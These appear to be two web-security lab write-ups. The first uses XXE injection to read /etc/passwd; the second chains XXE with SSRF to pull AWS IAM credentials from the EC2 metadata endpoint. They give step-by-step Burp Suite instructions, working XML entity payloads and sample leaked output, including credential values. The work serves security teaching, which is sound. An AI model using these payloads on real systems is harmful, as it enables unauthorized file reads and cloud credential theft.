**LAB 1**
### Writeup: Exploiting XXE to Read the `/etc/passwd` File

---

#### **Objective**:
To demonstrate how an **XML External Entity (XXE)** vulnerability can be exploited to read sensitive files on a server, such as the `/etc/passwd` file, by manipulating an XML request.

---

#### **Steps**:

1. **Visit the Product Page**:
   - Navigate to the target website and visit a product page.
   - Look for a feature like "Check stock" or any functionality that triggers a request to check product availability.

2. **Intercept the Request**:
   - Open **Burp Suite** and configure your browser to route traffic through it.
   - Click the "Check stock" button on the product page.
   - In Burp Suite, intercept the resulting **POST request** in the **Proxy** tab.

3. **Analyze the Request**:
   - Observe that the request contains XML data, likely in the body of the POST request. For example:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <stockCheck>
         <productId>123</productId>
         <storeId>1</storeId>
     </stockCheck>
     ```

4. **Inject the External Entity Definition**:
   - Insert an external entity definition between the XML declaration and the `stockCheck` element. For example:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
     <stockCheck>
         <productId>&xxe;</productId>
         <storeId>1</storeId>
     </stockCheck>
     ```
   - Here, the `xxe` entity is defined to load the contents of the `/etc/passwd` file from the server.

5. **Replace the `productId` with the Entity Reference**:
   - Replace the numeric value of `productId` with a reference to the external entity (`&xxe;`). This will cause the server to replace `&xxe;` with the contents of the `/etc/passwd` file when parsing the XML.

6. **Forward the Request**:
   - Forward the modified request in Burp Suite and observe the server's response.

---

#### **Expected Result**:
- The server processes the malicious XML and attempts to resolve the `xxe` entity by reading the `/etc/passwd` file.
- The response will likely contain an error message like:
  ```
  Invalid product ID: root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  ...
  ```
- This output confirms that the server has successfully read and returned the contents of the `/etc/passwd` file, demonstrating the XXE vulnerability.

---

LAB 2 - XXE WITH SSRF
# **XXE to SSRF Exploitation Write-up**  

## **Objective**  
To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's **IAM secret access key** from the **EC2 metadata endpoint**.

---

## **Steps to Exploit the XXE Vulnerability**  

### **1. Intercept the Stock Check Request**  
- Visit a product page on the target web application.  
- Click on **"Check stock"** to generate a request.  
- Open **Burp Suite** and go to the **Proxy** tab to **intercept the request**.  

---

### **2. Modify the XML Request to Inject an External Entity**  
- The original request body contains an XML structure like:  

  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>123</productId>
  </stockCheck>
  ```  

- Modify it to include an **external entity definition** that targets the AWS metadata API:  

  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [  
    <!ENTITY xxe SYSTEM "http://169.254.169.254/">  
  ]>
  <stockCheck>
    <productId>&xxe;</productId>
  </stockCheck>
  ```  

- Forward this request to the server.  

---

### **3. Extract the Initial Metadata Response**  
- The response should contain an **"Invalid product ID"** message, followed by the **contents of the metadata endpoint**.  
- The initial response may list available folders, such as:  

  ```
  Invalid product ID: meta-data/
  ```  

---

### **4. Explore the AWS Metadata API**  
- Modify the **entity URL** to explore deeper directories:  

  ```
  <!DOCTYPE foo [  
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">  
  ]>
  <stockCheck>
    <productId>&xxe;</productId>
  </stockCheck>
  ```  

- The response should return available metadata categories:  

  ```
  Invalid product ID: iam/
  ```

- Continue refining the payload to extract **IAM credentials**:  

  ```
  <!DOCTYPE foo [  
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">  
  ]>
  <stockCheck>
    <productId>&xxe;</productId>
  </stockCheck>
  ```  

---

### **5. Extract AWS Credentials**  
- The response should now return **AWS IAM credentials** in JSON format, containing:  
  - `AccessKeyId`  
  - `SecretAccessKey`  
  - `Token`  

  Example response:  

  ```
  "Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2025-01-31T13:00:03.058000926Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "FZAOCiMDHsO0sjuoAmMY",
  "SecretAccessKey" : "qFd3EBresB8ROr5aGcySRLKZj5n3dC0Diz1C2OEJ",
  "Token" : "V71vS981zt0MzLNZc7zhtVT87oqyzCjEcxHg9eF7nWE9mMrY3e1gR04sHuil6aWBHiszKbD4Qbx58fp1Rx2qkWuDb0X0DzgY6o7pZtSC1mk88hV4IK5JlLR4sGH8DZHwQ5tZ6k0qiaSjXBIFXoACF3AJx48JIYVGTtqQ7n3RviG3lvdUg1mWz0l2xC4cDfTv5XnPMkz5dSHAMeubWcOegy4piHU1hO6ejqSh623Zr11uP7mXbMYQDuuuTR4WmW4u",
  "Expiration" : "2031-01-30T13:00:03.058000926Z"}"
  ```  

## **Conclusion**  
This lab demonstrates how **XXE Injection** can be leveraged to conduct **SSRF attacks** against internal cloud metadata services. By iteratively refining the payload, attackers can extract **AWS IAM credentials**, leading to potential full cloud compromise.
